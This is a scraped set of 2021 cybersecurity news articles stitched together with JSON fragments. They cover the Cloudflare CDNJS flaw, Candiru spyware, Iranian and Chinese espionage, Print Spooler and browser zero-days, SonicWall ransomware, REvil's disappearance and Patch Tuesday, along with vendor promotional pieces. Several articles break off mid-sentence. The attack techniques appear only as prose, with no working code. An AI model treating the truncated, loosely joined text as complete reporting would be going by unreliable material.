'text': 'Web infrastructure and website security company Cloudflare last month fixed a critical vulnerability in its CDNJS library that’s used by 12.7% of all websites on the internet.\nCDNJS is a free and open-source content delivery network (CDN) that serves about 4,041 JavaScript and CSS libraries, making it the second most popular CDN for JavaScript after Google Hosted Libraries.\nThe weakness concerned an issue in the CDNJS library update server that could potentially allow an attacker to execute arbitrary commands, leading to a complete compromise.\n\nThe vulnerability was discovered and reported by security researcher RyotaK on April 6, 2021. There is no evidence of in-the-wild attacks abusing this flaw.\nSpecifically, the vulnerability works by publishing packages to Cloudflare’s CDNJS using GitHub and npm, using it to trigger a path traversal vulnerability, and ultimately trick the server into executing arbitrary code, thus achieving remote code execution.\nIt’s worth noting that the CDNJS infrastructure includes features to automate library updates by periodically running scripts on the server to download relevant files from the respective user-managed Git repository or npm package registry. \n\nBy uncovering an issue with how the mechanism sanitizes package paths, RyotaK found that “arbitrary code can be executed after performing path traversal from the .tgz file published to npm and overwriting the script that is executed regularly on the server.“\nIn other words, the goal of the attack is to publish a new version of a specially-crafted package to the repository, which is then picked up the CDNJS library update server for publishing, in the process copying the contents of the malicious package into a regularly executed script file hosted on the server, thereby gaining arbitrary code execution.\n\n“While this vulnerability could be exploited without any special skills, it could impact many websites,“ RyotaK said. “Given that there are many vulnerabilities in the supply chain, which are easy to exploit but have a large impact, I feel that it’s very scary.“\nThis is not the first time the security researcher has uncovered code execution flaws in the way updates to software repositories are handled. In April 2021, RyotaK disclosed a critical vulnerability in the official Homebrew Cask repository could have been exploited by an attacker to execute arbitrary code on users’ machines.\n\n\nFound this article interesting?

{'title': 'Israeli Firm Helped Governments Target Journalists, Activists with 0-Days and Spyware',
'text': 'Two of the zero-day Windows flaws rectified by Microsoft as part of its Patch Tuesday update earlier this week were weaponized by an Israel-based company called Candiru in a series of “precision attacks“ to hack more than 100 journalists, academics, activists, and political dissidents globally.\nThe spyware vendor was also formally identified as the commercial surveillance company that Google’s Threat Analysis Group (TAG) revealed as exploiting multiple zero-day vulnerabilities in Chrome browser to target victims located in Armenia, according to a report published by the University of Toronto’s Citizen Lab.\n“Candiru’s apparent widespread presence, and the use of its surveillance technology against global civil society, is a potent reminder that the mercenary spyware industry contains many players and is prone to widespread abuse,“ Citizen Lab researchers said. “This case demonstrates, yet again, that in the absence of any international safeguards or strong government export controls, spyware vendors will sell to government clients who will routinely abuse their services.“\n\nFounded in 2014, the private-sector offensive actor (PSOA) — codenamed “Sourgum“ by Microsoft — is said to be the developer of an espionage toolkit dubbed DevilsTongue that’s exclusively sold to governments and is capable of infecting and monitoring a broad range of devices across different platforms, including iPhones, Androids, Macs, PCs, and cloud accounts.\nCitizen Lab said it was able to recover a copy of Candiru’s Windows spyware after obtaining a hard drive from “a politically active victim in Western Europe,“ which was then reverse engineered to identify two never-before-seen Windows zero-day exploits for vulnerabilities tracked as CVE-2021-31979 and CVE-2021-33771 that were leveraged to install malware on victim boxes.\nThe infection chain relied on a mix of browser and Windows exploits, with the former served via single-use URLs sent to targets on messaging applications such as WhatsApp. Microsoft addressed both the privilege escalation flaws, which enable an adversary to escape browser sandboxes and gain kernel code execution, on July 13.\nThe intrusions culminated in the deployment of DevilsTongue, a modular C/C++-based backdoor equipped with a number of capabilities, including exfiltrating files, exporting messages saved in the encrypted messaging app Signal, and stealing cookies and passwords from Chrome, Internet Explorer, Firefox, Safari, and Opera browsers.\nMicrosoft’s analysis of the digital weapon also found that it could abuse the stolen cookies from logged-in email and social media accounts like Facebook, Twitter, Gmail, Yahoo, Mail.ru, Odnoklassniki, and Vkontakte to collect information, read the victim’s messages, retrieve photos, and even send messages on their behalf, thus allowing the threat actor to send malicious links directly from a compromised user’s computer.\nSeparately, the Citizen Lab report also tied the two Google Chrome vulnerabilities disclosed by the search giant on Wednesday — CVE-2021-21166 and CVE-2021-30551 — to the Tel Aviv company, noting overlaps in the websites that were used to distribute the exploits.\n\nFurthermore, 764 domains linked to Candiru’s spyware infrastructure were uncovered, with many of the domains masquerading as advocacy organizations such as Amnesty International, the Black Lives Matter movement, as well as media companies, and other civil-society themed entities. Some of the systems under their control were operated from Saudi Arabia, Israel, U.A.E., Hungary, and Indonesia.\nOver 100 victims of SOURGUM’s malware have been identified to date, with targets located in Palestine, Israel, Iran, Lebanon, Yemen, Spain (Catalonia), United Kingdom, Turkey, Armenia, and Singapore. “These attacks have largely targeted consumer accounts, indicating Sourgum’s customers were pursuing particular individuals,“ Microsoft’s General Manager of Digital Security Unit, Cristin Goodwin, said.\nThe latest report arrives as TAG researchers Maddie Stone and Clement Lecigne noted a surge in attackers using more zero-day exploits in their cyber offensives, in part fueled by more commercial vendors selling access to zero-days than in the early 2010s.\n“Private-sector offensive actors are private companies that manufacture and sell cyberweapons in hacking-as-a-service packages, often to government agencies around the world, to hack into their targets’ computers, phones, network infrastructure, and other devices,“ Microsoft Threat Intelligence Center (MSTIC) said in a technical rundown.\n“With these hacking packages, usually the government agencies choose the targets and run the actual operations themselves. The tools, tactics, and procedures used by these companies only adds to the complexity, scale, and sophistication of attacks,“ MSTIC added.\n\n\nFound this article interesting?

However, the threat landscape of the recent years tells otherwise—in fact, every organization, regardless of vertical and size is at risk, whether as a direct target, supply chain or collateral damage.\n\nThe vast majority of security decision-makers acknowledge they need to address the APT risk with additional security solutions but struggle with mapping APT attack vectors to a clear-cut set of security product capabilities, which impairs their ability to choose the products that would best protect them.\n\nCynet is now addressing this need with the definitive RFP templates for EDR/EPP and APT Protection, an expert-made security requirement list, that enables stakeholders to accelerate and optimize the evaluation process of the products they evaluate.\n\nThese RFP templates aim to capture the widest common denominator in terms of security needs and deliver the essential that are relevant for any organization.\n\nThus, using these ready-made templates can potentially save volumes of times and resources otherwise spent on building a similar requirement list from scratch.\n\nAPT groups, as the name implies, are highly persistent. In practice, this persistence manifests in targeting numerous attack surfaces until successful compromise.\n\nTo adequately defend from such attacks one must be well acquainted with both of these attack surfaces, as well as with the various vectors attackers use to target them. \n\n\n“The best analogy is a Ninja warrior with multiple weapons,“’ says Eyal Gruner, Co-Founder of Cynet, “as an attacker you seek the weak link until you find it—vulnerable endpoint, VPN credentials, networking misconfiguration, insecure DMZ architecture… it’s really endless.“\n\n\n“But of course, there are vectors that are used more. Some, because they yield better results and some because they are easier to execute. Like any industry, there are common practices you can clearly map out.“\n\nThis attack vector map should reside on the backend of any cybersecurity purchase. In the long run, the investment in security would be measured against its success in preventing cyber derive damage from occurring. \n\nHowever, many security decision-makers don’t have the attacker perspective that would enable them to adequately prioritize the capabilities they need their security products to have.\n\nTo address this need, Cynet releases the Definitive EDR/EPP and APT Protection RFP templates, to be used as a free resource by organizations that seek protection from advanced threats.\n\n\n“We took the knowledge we’ve accumulated throughout years of offensive security and attack research,“ says Gruner, “and asked ourselves – as attackers, what kind of protection would have strained us to the degree that we might reconsider shifting to another target.“\n\n\n“It was a fascinating journey for us as well which really forced us to objectively reflect on the pros and cons of a wide attacking tools array.“\n\nThis is exactly the missing link in the knowledge of the common security buyer, which makes perfect sense—after all non-attackers are not expected to master the attackers’ best practices book.\n\nThese decision-makers, however, do know more than anyone else what they have and what they need to protect. The Definitive APT Protection RFP can force-multiply the quality purchase decisions, ensuring that they indeed deliver.\n\nThe RFP comprises five sections:\n\nMonitoring & Control—routine activities to gain visibility and proactively discover and reduce attack surfaces.Prevention & Detection—mechanism to thwart the wide array of commodity and advanced attack vectors.Investigation & Response—an overall toolset for efficient reaction to the detected live attacks.Infrastructure (EDR only)—architecture, deployment, data collection and communication.Operation—ongoing management of the solution\n\n“I guess there isn’t an organization that didn’t experience at one time or another buying something shiny that seemed amazing and ended up with little value, we see it all time,“ says Gruner. \n\n“Either it didn’t work or address some esoteric attack vector that looked great in the demo but never happened in real life. The Definitive Guide is meant to prevent this kind of scenarios.“\n\nDownload the Definitive EDR/EPP and APT Protection RFP Templates here.\n\n\nFound this article interesting?

'text': 'Facebook on Thursday disclosed it dismantled a “sophisticated“ online cyber espionage campaign conducted by Iranian hackers targeting about 200 military personnel and companies in the defense and aerospace sectors in the U.S., U.K., and Europe using fake online personas on its platform.\nThe social media giant pinned the attacks to a threat actor known as Tortoiseshell (aka Imperial Kitten) based on the fact that the adversary used similar techniques in past campaigns attributed to the threat group, which was previously known to focus on the information technology industry in Saudi Arabia, suggesting an apparent expansion of malicious activity.\n\n“This group used various malicious tactics to identify its targets and infect their devices with malware to enable espionage,“ said Mike Dvilyanski, Head of Cyber Espionage Investigations, and David Agranovich, Director, Threat Disruption, at Facebook. “This activity had the hallmarks of a well-resourced and persistent operation, while relying on relatively strong operational security measures to hide who’s behind it.“\nAccording to the company, the attacks were part of a much larger cross-platform campaign, with the bad actors leveraging Facebook as a social engineering vector to redirect the victims to rogue domains via malicious links.\nTo that end, Tortoiseshell is said to have deployed sophisticated fictitious personas to contact its targets, and sometimes engaging with them for months to build trust, by masquerading as recruiters and employees of defense and aerospace companies, while a few others claimed to work in hospitality, medicine, journalism, NGOs and airlines industries.\nThe fraudulent domains, including fake versions of a U.S. Department of Labor job search portal and recruiting websites, were designed to target persons of likely interest within the aerospace and defense industries with the ultimate goal of perpetrating credential theft and siphoning data from email accounts belonging to the targets.\n\nBesides taking advantage of different collaboration and messaging platforms to move conversations off-platform and deliver target-tailored malware to their victims, the threat actor also profiled their systems to vacuum information about the networks the devices were connected to and the software installed on them to deploy full-featured remote access trojans (RATs), device and network reconnaissance tools, and keystroke loggers.\nFurthermore, Facebook’s analysis of Tortoiseshell’s malware infrastructure found that a portion of their toolset was developed by Mahak Rayan Afraz (MRA), an IT company in Tehran with ties to the Islamic Revolutionary Guard Corps (IRGC).\n“To disrupt this operation, we blocked malicious domains from being shared on our platform, took down the group’s accounts and notified people who we believe were targeted by this threat actor,“ Dvilyanski and Agranovich said. Around 200 accounts run by the hacking group were removed, Facebook added.\n\n\nFound this article interesting?

{'title': 'Microsoft Warns of New Unpatched Windows Print Spooler Vulnerability',
'text': 'Microsoft on Thursday shared fresh guidance on yet another vulnerability affecting the Windows Print Spooler service, stating that it’s working to address it in an upcoming security update.\nTracked as CVE-2021-34481 (CVSS score: 7.8), the issue concerns a local privilege escalation flaw that could be abused to perform unauthorized actions on the system. The company credited security researcher Jacob Baines for discovering and reporting the bug.\n\n“An elevation of privilege vulnerability exists when the Windows Print Spooler service improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges,“ the Windows maker said in its advisory. “An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.“\nHowever, it’s worth pointing out that successful exploitation of the vulnerability requires the attacker to have the ability to execute code on a victim system. In other words, this vulnerability can only be exploited locally to gain elevated privileges on a device.\n\nAs workarounds, Microsoft is recommending users to stop and disable the Print Spooler service to prevent malicious actors from exploiting the vulnerability.\nThe development comes days after the Redmond-based firm rolled out patches to address a critical shortcoming in the same component that it disclosed as being actively exploited to stage in-the-wild attacks, making it the third printer-related flaw to come to light in recent weeks.\n\nDubbed PrintNightmare (CVE-2021-34527), the vulnerability stems from a missing permission check in the Print Spooler that enables the installation of malicious print drivers to achieve remote code execution or local privilege escalation on vulnerable systems.\nHowever, it later emerged that the out-of-band security update could be entirely bypassed under specific conditions to gain both local privilege escalation and remote code execution. Microsoft has since said the fixes are “working as designed and is effective against the known printer spooling exploits and other public reports collectively being referred to as PrintNightmare.“\n\n\nFound this article interesting?

{'title': 'China’s Cyberspies Targeting Southeast Asian Government Entities',
'text': 'A sweeping and “highly active campaign“ that originally set its sights on Myanmar has broadened its focus to strike a number of targets located in the Philippines, according to new research.\nRussian cybersecurity firm Kaspersky, which first spotted the infections in October 2020, attributed them to a threat actor it tracks as “LuminousMoth,“ which it connected with medium to high confidence to a Chinese state-sponsored hacking group called HoneyMyte or Mustang Panda, given its observed victimology, tactics, and procedures.\nAbout 100 affected victims have been identified in Myanmar, while the number of victims jumped to nearly 1,400 in the Philippines, although the researchers noted that the actual targets were only a fraction of the initial numbers, including government entities located both within the two countries and abroad.\n\nThe goal of the attacks is to affect a wide perimeter of targets with the aim of hitting a select few that are of strategic interest, researchers Mark Lechtik, Paul Rascagneres, and Aseel Kayal said. Put differently, the intrusions are simultaneously wide-ranging and narrow-focused, enabling the threat acor to siphon intelligence from high-profile targets.\n\nThe infection vector used in the campaign involves sending a spear-phishing email to the victim containing a Dropbox download link that, when clicked, leads to a RAR archive that’s designed to mimic a Word document. The archive file, for its part, comes with two malicious DLL libraries (“version.dll“ and “wwlib.dll“) and two corresponding executable files that run the malware.\nUpon successfully gaining a foothold, an alternative infection chain observed by Kaspersky leverages removable USB drives to propagate the malware to other hosts with the help of “version.dll“. On the other hand, the purpose of “wwlib.dll“ is to download a Cobalt Strike beacon on the compromised Windows system from a remote attacker-controlled domain.\n\nIn some instances, the attacks incorporated an extra step wherein the threat actor deployed a post-exploitation tool in the form of a signed-but-rogue version of Zoom video conferencing app, using it to hoover sensitive files to a command-and-control server. A valid digital certificate was used to sign the software in an effort to pass off the tool as benign. Also spotted on some infected machines was a second post-exploitation utility that steals cookies from Google Chrome browser.\n\nLuminousMoth’s malicious cyber operations and its possible ties to Mustang Panda APT may also be an attempt to shift tactics and update their defensive measures by re-tooling and developing new and unknown malware implants, Kaspersky noted, thus potentially obscuring any ties to their past activities and blurring their attribution to known groups.\n“APT actors are known for the frequently targeted nature of their attacks. Typically, they will handpick a set of targets that in turn are handled with almost surgical precision, with infection vectors, malicious implants and payloads being tailored to the victims’ identities or environment,“ Kaspersky researchers said.\n“It’s not often we observe a large-scale attack conducted by actors fitting this profile, usually due to such attacks being noisy, and thus putting the underlying operation at risk of being compromised by security products or researchers.“\n\n\nFound this article interesting?

{'title': 'New Zero-Trust API Offers Mobile Carrier Authentication to Developers',
'text': 'Zero Trust is increasingly being adopted as the best strategy to maintain application security and prevent data breaches. To help achieve progress on Zero Trust, there is now a new, easy way to implement continuous user verification by connecting directly to the authentication systems used by mobile operators – without the overhead of processing or storing user data. \nBefore we show you how it works and how to integrate it, let’s start with the fundamental challenge.\nZero Trust and Authentication\nThe Zero Trust model of identity verification essentially means never trusting that a returning user is whom they claim to be, regardless of their location or previous successful attempts. Zero Trust is a strategic approach to access management that is vital for keeping out bad actors. \nAs the world moves to the cloud, with an increasingly distributed network of employees, partners, and clients, tighter auth journeys become even more important. \nBut with greater security comes greater friction – users have to invent intricate passwords, remember security questions, and interrupt their workflows with authenticator app codes, SMS PINs, and other multi-factor authentication (MFA) methods. \nThe Trade-off Between Security and UX\nWe know that knowledge factors like passwords are less than ideal. Compromised passwords are behind the majority of data breaches and attacks, and Forrester Research estimates that in the enterprise environment, each employee password reset costs $70 in help desk support. That’s without taking into account the overall frustrating user experience.\nBiometrics, on the other hand, is unrealistic as Zero Trust requirements for the average user. You also don’t need to request such personal information for all types of access. \nPossession factors provide a solid middle ground, and proof of possession of a mobile device is more universal. Plus, mobile phone numbers aren’t overly personal. \nHowever, possession checks which use codes – even authenticator apps – are vulnerable to man-in-the-middle (MITM) and SIM swap attacks, as well as creating UX problems – from SMS codes that never arrive to the pressure of typing numbers from an authenticator app against a countdown. \nA simpler and safer form of checking possession factor while maintaining Zero Trust is already in users’ hands – it’s the mobile phone and the SIM card inside it. \nHow to Verify Users by Connecting Directly to Mobile Networks \nThe SIM card within the phone is already authenticated with the Mobile Network Operator (MNO). It is SIM authentication that allows mobile customers to make and receive phone calls and connect to data. Now you can use this same powerful authentication method for your own website or mobile app, using tru.ID.\ntru.ID partners directly with global carriers to offer three kinds of APIs that integrate with the network’s authentication infrastructure, using the data connection and without collecting any personally identifiable information (PII). The tru.ID API verifies whether the SIM card associated with the phone number has recently changed, providing silent, continuous verification.\nZero Friction, Zero Trust, Zero-Knowledge\nSIM-based authentication is invisible to the user – the check of the SIM happens in the background once the user inputs their mobile number. If your site or app already has the mobile phone number stored, even better - there’s no user action required at all. This improved UX creates seamless account experiences without compromising security. \nNo personally identifiable user data or application information is exchanged during the MNO number and SIM lookup – the check is over a data connection and validates official carrier information. \nHow to Get Started\nFor continuous Zero Trust authorization in the background using the SIM, SIMCheck is recommended, having the additional benefit of being a quick, easy, and server-side integration. Should the lookup return recent changes to the SIM, you may choose to implement additional step-up verification.\nHow is all this achieved programmatically? With one API call. When something happens on the client side which requires a step up or security check, the client informs the server, which makes this API call to check if the SIM has changed for the user’s phone number:\ncurl --location --request POST ’https://eu.api.tru.id/sim_check/v0.1/checks’ \\n--header ’Content-Type: application/json’ \\n--header ’Authorization: Bearer <Token>’ \\n--data-raw ’{“phone_number“: “<PhoneNumber>“}’\n\nThe SIMCheck API response will look something like this, where the `no_sim_change` property is the key to tell us whether the SIM card has changed recently:\n\n{\n    “check_id“: “<CHECK_ID>“,\n    “status“: “COMPLETED“,\n    “no_sim_change“: true,\n    “charge_amount“: 1.00000,\n    “charge_currency“: “API“,\n    “created_at“: “2021-07-13T23:44:19+0000“,\n    “snapshot_balance“: 10.000\n}\n\nAfter this, the server informs the client whether the transaction or request can proceed. If it fails, your site or app can either deny access, or require an additional, non-telephonic form of authentication. \nWant to try it for yourself? You can start testing for free and make your first API call within minutes – just sign up with tru.ID or check the documentation. tru.ID is keen to hear from the community to discuss case studies. \nTo learn more about how SIM-based authentication works, you can read about authenticating users with SubscriberCheck here. \n\n\nFound this article interesting?

'text': 'Networking equipment maker SonicWall is alerting customers of an “imminent“ ransomware campaign targeting its Secure Mobile Access (SMA) 100 series and Secure Remote Access (SRA) products running unpatched and end-of-life 8.x firmware.\nThe warning comes more than a month after reports emerged that remote access vulnerabilities in SonicWall SRA 4600 VPN appliances (CVE-2019-7481) are being exploited as an initial access vector for ransomware attacks to breach corporate networks worldwide.\n\n“SonicWall has been made aware of threat actors actively targeting Secure Mobile Access (SMA) 100 series and Secure Remote Access (SRA) products running unpatched and end-of-life (EOL) 8.x firmware in an imminent ransomware campaign using stolen credentials,“ the company said. “The exploitation targets a known vulnerability that has been patched in newer versions of firmware.“\nSMA 1000 series products are not affected by the flaw, SonicWall noted, urging businesses to take immediate action by either updating their firmware wherever applicable, turning on multi-factor authentication, or disconnecting the appliances that are past end-of-life status and cannot be updated to 9.x firmware.\n“The affected end-of-life devices with 8.x firmware are past temporary mitigations. Continued use of this firmware or end-of-life devices is an active security risk,“ the company cautioned. As additional mitigation, SonicWall is also recommending customers reset all passwords associated with the SMA or SRA device, as well as any other devices or systems that may be using the same credentials.\n\nThe development also marks the fourth time SonicWall devices have emerged as a lucrative attack vector, with threat actors exploiting previously undisclosed flaws to drop malware and dig deeper into the targeted networks, making it the latest issue the company has grappled with in recent months.\nIn April, FireEye Mandiant disclosed that a hacking group tracked as UNC2447 was using a then-zero-day flaw in SonicWall VPN appliances (CVE-2021-20016) prior to it being patched by the company to deploy a new strain of ransomware called FIVEHANDS on the networks of North American and European entities.\n\n\nFound this article interesting?

'text': 'Threat intelligence researchers from Google on Wednesday shed more light on four in-the-wild zero-days in Chrome, Safari, and Internet Explorer browsers that were exploited by malicious actors in different campaigns since the start of the year.\nWhat’s more, three of the four zero-days were engineered by commercial providers and sold to and used by government-backed actors, contributing to an uptick in real-world attacks. The list of now-patched vulnerabilities is as follows -\nCVE-2021-1879: Use-After-Free in QuickTimePluginReplacement (Apple WebKit)CVE-2021-21166: Chrome Object Lifecycle Issue in AudioCVE-2021-30551: Chrome Type Confusion in V8CVE-2021-33742: Internet Explorer out-of-bounds write in MSHTML\nBoth Chrome zero-days — CVE-2021-21166 and CVE-2021-30551 — are believed to have been used by the same actor, and were delivered as one-time links sent via email to targets located in Armenia, with the links redirecting unsuspecting users to attacker-controlled domains that masqueraded as legitimate websites of interest to the recipients.\n\nThe malicious websites took charge of fingerprinting the devices, including collecting system information about the clients, before delivering a second-stage payload.\nWhen Google rolled out a patch for CVE-2021-30551, Shane Huntley, Director of Google’s Threat Analysis Group (TAG), revealed that the vulnerability was leveraged by the same actor that abused CVE-2021-33742, an actively exploited remote code execution flaw in Windows MSHTML platform that was addressed by Microsoft as part of its Patch Tuesday update on June 8.\nThe two zero-days were provided by a commercial exploit broker to a nation-state adversary, which used them in limited attacks against targets in Eastern Europe and the Middle East, Huntley previously added.\n\nNow according to a technical report published by the team, all the three zero-days were “developed by the same commercial surveillance company that sold these capabilities to two different government-backed actors,“ adding the Internet Explorer flaw was used in a campaign targeting Armenian users with malicious Office documents that loaded web content within the web browser.\nGoogle did not disclose the identities of the exploit broker or the two threat actors that used the vulnerabilities as part of their attacks.\nSolarWinds Hackers Exploited iOS Zero-Day\nThe Safari zero-day, in contrast, concerned a WebKit flaw that could enable adversaries to process maliciously crafted web content that may result in universal cross-site scripting attacks. The issue was rectified by Apple on March 26, 2021.Attacks leveraging CVE-2021-1879, which Google attributed to a “likely Russian government-backed actor,“ were executed by means of sending malicious links to government officials over LinkedIn that, when clicked from an iOS device, redirected the user to a rogue domain that served the next-stage payloads.\n\nIt’s worth noting that the offensive also mirrors a wave of targeted attacks unleashed by Russian hackers tracked as Nobelium, which was found abusing the vulnerability to strike government agencies, think tanks, consultants, and non-governmental organizations as part of an email phishing campaign.\nNobelium, a threat actor linked to the Russian Foreign Intelligence Service (SVR), is also suspected of orchestrating the SolarWinds supply chain attack late last year. It’s known by other aliases such as APT29, UNC2452 (FireEye), SolarStorm (Unit 42), StellarParticle (Crowdstrike), Dark Halo (Volexity), and Iron Ritual (Secureworks).\n“Halfway into 2021, there have been 33 zero-day exploits used in attacks that have been publicly disclosed this year — 11 more than the total number from 2020,“ TAG researchers Maddie Stone and Clement Lecigne noted. “While there is an increase in the number of zero-day exploits being used, we believe greater detection and disclosure efforts are also contributing to the upward trend.“\n\n\nFound this article interesting?

{'title': '16 Cybercriminals Behind Mekotio and Grandoreiro Banking Trojan Arrested in Spain',
'text': 'Spanish law enforcement agencies on Wednesday arrested 16 individuals belonging to a criminal network in connection with operating two banking trojans as part of a social engineering campaign targeting financial institutions in Europe.\nThe arrests were made in Ribeira (A Coruña), Madrid, Parla and Móstoles (Madrid), Seseña (Toledo), Villafranca de los barros (Badajoz), and Aranda de Duero (Burgos) following a year-long investigation codenamed “Aguas Vivas“, the Civil Guard said in a statement.\n“Through malicious software, installed on the victim’s computer by the technique known as ’email spoofing’, [the group] would have managed to divert large amounts of money to their accounts,“ authorities noted.\n\nComputer equipment, mobile phones, and documents were confiscated, and more than 1,800 spam emails were analyzed, enabling law enforcement to block transfer attempts totaling €3.5 million successfully. The campaign is said to have netted the actors €276,470, of which €87,000 has been successfully recovered.\nAs part of an effort to lend credibility to their phishing attacks, the operators worked by sending emails under the guise of legitimate package delivery services and government entities such as the Treasury, urging the recipients to click on a link that stealthily downloaded malicious software onto the systems. \n\nThe malware — dubbed “Mekotio“ and “Grandoreiro“ — functioned by intercepting transactions on a banking website to unauthorizedly siphon funds to accounts under the attackers’ control. At least 68 email accounts belonging to official bodies were infected to facilitate such fraudulent transfers.\n“After that, the money was diversified by sending it to other accounts, or by withdrawing cash at ATMs, transfers by BIZUM, REVOLUT cards, etc., in order to hinder the possible police investigation,“ the Civil Guard said.\n\nGrandoreiro and Mekotio (aka Melcoz) are both part of a “Tetrade“ of Brazilian banking trojans as detailed by cybersecurity firm Kaspersky in July 2020, while the latter’s evolving tactics were disclosed by ESET in August 2020, which involved displaying fake pop-up windows to its victims in an attempt to entice them into divulging sensitive information.\n“These windows are carefully designed to target Latin American banks and other financial institutions,“ the Slovak cybersecurity company had noted.\nOperational since at least 2016, Grandoreiro has a history of singling out Brazil, Mexico, Spain, Portugal, and Turkey, “with the attackers regularly improving techniques, striving to stay undetected and active for longer periods of time.“ Mekotio, on the other hand, has been observed in attacks targeting Brazil and dating back to 2018, before expanding to Chile, Mexico, and Spain.\n“[Mekotio] steals passwords from browsers and from the device’s memory, providing remote access to capture internet banking access,“ Kaspersky researchers explained in a report published Wednesday. “It also includes a Bitcoin wallet stealing module.“\nTo avoid falling prey to such attacks, the agency is recommending that email and SMS recipients scrutinize messages carefully, particularly if it is about entities with urgent requests, promotions, or very attractive bargains, while also taking steps to be on the lookout for grammatical errors and ensure the authenticity of the sender of the message.\n\n\nFound this article interesting?

{'title': 'REvil Ransomware Gang Mysteriously Disappears After High-Profile Attacks',
'text': 'REvil, the infamous ransomware cartel behind some of the biggest cyberattacks targeting JBS and Kaseya, has mysteriously disappeared from the dark web, leading to speculations that the criminal enterprise may have been taken down.\nMultiple darknet and clearnet sites maintained by the Russia-linked cybercrime syndicate, including the data leak, extortion, and payment portals, remained inaccessible, displaying an error message “Onionsite not found.“ \nThe group’s Tor network infrastructure on the dark web consists of one data leak blog site and 22 data hosting sites. It’s not immediately clear what prompted the infrastructure to be knocked offline.\nREvil is one of the most prolific ransomware-as-a-service (RaaS) groups that first appeared on the threat landscape in April 2019. It’s an evolution of the GandCrab ransomware, which hit the underground markets in early 2018.\n“If REvil has been permanently disrupted, it’ll mark the end of a group which has been responsible for >360 attacks on the U.S. public and private sectors this year alone,“ Emsisoft’s Brett Callow tweeted.\n\nThe sudden development comes close on the heels of a wide-scale supply chain ransomware attack aimed at technology services provider Kaseya, for which REvil (aka Sodinokibi) took responsibility for and demanded a $70 million ransom to unlock access to encrypted systems in exchange for a universal decryption key that would unlock all victims data.\nThe disastrous attack saw the ransomware gang encrypting approximately 60 managed service providers (MSPs) and over 1,500 downstream businesses using a zero-day vulnerability in the Kaseya VSA remote management software. In late May, REvil also masterminded the attack on the world’s largest meat producer JBS, which ended up paying $11 million to the extortionists to recover from the incident.\n\nThe outage also coincides with U.S. President Joe Biden’s phone call with Russian President Vladimir Putin last week, pressing the latter to take steps to disrupt ransomware groups operating in the country, while warning of retaliatory action to defend critical infrastructure.\n“The situation is still unfolding, but evidence suggests REvil has suffered a planned, concurrent takedown of their infrastructure, either by the operators themselves or via industry or law enforcement action,“ FireEye Mandiant’s John Hultquist told CNBC.\nIt appears that REvil’s Happy Blog was taken offline around 1 AM EST on Tuesday, with vx-underground noting that the group’s public-facing representative, Unknown, has not posted on popular hacking forums such as Exploit and XSS since July 8.\nSubsequently, a representative for LockBit ransomware posted to the XSS Russian-speaking hacking forum that REvil’s attack infrastructure received a government legal request, causing the servers to be dismantled. “REvil is banned from XSS,“ vx-underground later added.\nIt’s not uncommon for ransomware groups to go under the ground following highly publicized incidents. After the DarkSide gang targeted Colonial Pipeline in May, the operators announced plans to wind up its RaaS affiliate program for good, claiming that its servers had been seized by an unknown law enforcement agency, raising questions as to whether the group actually retired, or rebranded under a new name.\n\nThis theory was validated a few weeks later when the U.S. Department of Justice revealed last month that it was able to recover most of the money paid by Colonial Pipeline to the DarkSide group through an analysis of the bitcoin trails.\nREvil’s unexplained shutdown, in a similar fashion, may as well be a case of planned retirement, or a temporary setback, forcing it to seemingly disband only to eventually reassemble under a new identity so as to attract less attention, or a consequence of increased international scrutiny in the wake of the global ransomware crisis.\nIf it indeed turns out that the group has permanently shuttered operations, the move is bound to leave the group’s targets in the lurch, with no viable means to negotiate ransoms and get hold of the decryption keys necessary to regain control of their systems, thus permanently locking them out of their data.\n“I don’t know what this means, but regardless, I’m happy!“ tweeted Katie Nickels, director of intelligence at Red Canary. “If it’s a government takedown - awesome, they’re taking action.

{'title': 'Update Your Windows PCs to Patch 117 New Flaws, Including 9 Zero-Days',
'text': 'Microsoft rolled out Patch Tuesday updates for the month of July with fixes for a total of 117 security vulnerabilities, including nine zero-day flaws, of which four are said to be under active attacks in the wild, potentially enabling an adversary to take control of affected systems. \nOf the 117 issues, 13 are rated Critical, 103 are rated Important, and one is rated as Moderate in severity, with six of these bugs publicly known at the time of release. \nThe updates span across several of Microsoft’s products, including Windows, Bing, Dynamics, Exchange Server, Office, Scripting Engine, Windows DNS, and Visual Studio Code. July also marks a dramatic jump in the volume of vulnerabilities, surpassing the number Microsoft collectively addressed as part of its updates in May (55) and June (50).\n\nChief among the security flaws actively exploited are as follows —\nCVE-2021-34527 (CVSS score: 8.8) - Windows Print Spooler Remote Code Execution Vulnerability (publicly disclosed as “PrintNightmare“)CVE-2021-31979 (CVSS score: 7.8) - Windows Kernel Elevation of Privilege VulnerabilityCVE-2021-33771 (CVSS score: 7.8) - Windows Kernel Elevation of Privilege VulnerabilityCVE-2021-34448 (CVSS score: 6.8) - Scripting Engine Memory Corruption Vulnerability\nMicrosoft also stressed the high attack complexity of CVE-2021-34448, specifically stating that the attacks hinge on the possibility of luring an unsuspecting user into clicking on a link that leads to a malicious website hosted by the adversary and contains a specially-crafted file that’s engineered to trigger the vulnerability.\nThe other five publicly disclosed, but not exploited, zero-day vulnerabilities are listed below —\nCVE-2021-34473 (CVSS score: 9.1) - Microsoft Exchange Server Remote Code Execution VulnerabilityCVE-2021-34523 (CVSS score: 9.0) - Microsoft Exchange Server Elevation of Privilege VulnerabilityCVE-2021-33781 (CVSS score: 8.1) - Active Directory Security Feature Bypass VulnerabilityCVE-2021-33779 (CVSS score: 8.1) - Windows ADFS Security Feature Bypass VulnerabilityCVE-2021-34492 (CVSS score: 8.1) - Windows Certificate Spoofing Vulnerability\n“This Patch Tuesday comes just days after out-of-band updates were released to address PrintNightmare — the critical flaw in the Windows Print Spooler service that was found in all versions of Windows,“ Bharat Jogi, senior manager of vulnerability and threat research at Qualys, told The Hacker News.\n“While MSFT has released updates to fix the vulnerability, users must still ensure that necessary configurations are set up correctly. Systems with misconfigurations will continue to be at risk of exploitation, even after the latest patch has been applied. PrintNightmare was a highly serious issue that further underscores the importance of marrying detection and remediation,“ Jogi added.\nThe PrintNightmare vulnerability has also prompted the U.S. Cybersecurity and Infrastructure Security Agency (CISA) to release an emergency directive, urging federal departments and agencies to apply the latest security updates immediately and disable the print spooler service on servers on Microsoft Active Directory Domain Controllers.\n\nAdditionally, Microsoft also rectified a security bypass vulnerability in Windows Hello biometrics-based authentication solution (CVE-2021-34466, CVSS score: 5.7) that could permit an adversary to 